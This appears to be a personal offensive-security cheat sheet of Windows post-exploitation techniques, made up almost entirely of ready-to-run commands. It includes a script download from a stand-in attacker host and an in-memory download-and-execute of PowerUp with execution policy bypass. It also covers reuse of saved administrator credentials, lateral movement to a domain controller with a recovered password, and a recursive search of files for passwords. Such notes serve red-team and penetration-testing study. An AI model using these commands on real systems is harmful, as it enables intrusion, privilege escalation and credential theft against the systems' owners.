# WINDOWS TTPS
## Older services; 
- delivery of shells when you have command execution using rgsvr32

## Download scripts
```
invoke-webrequest http://badguy.com -outfile somefile.ps1
```

## world-writeable directory
```
C:\windows\System32\spool\drivers\color
```

## Download powerup and execute; in-mem
```
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
```

## search for writeable files -needs validation, this spits out files
```
dir /a-r-d /s /b
dir /a-r-d /s /b C:\
```

## check stored creds
```
runas /user:administrator /savecred "cmd.exe /k whoami"
```

## Lateral movement, if you've recovoered a password / user
```
$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass)
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
```


## get hotfix info
wmic qfe get Caption,Description,HotFixID,InstalledOn

## users and groups
net users
net localgroups
net user someusername

## network data
ipconfig /all
route print
arp -A

## what tokens we got
whoami /priv

## recursve string scan
findstr /spin "password" *.*
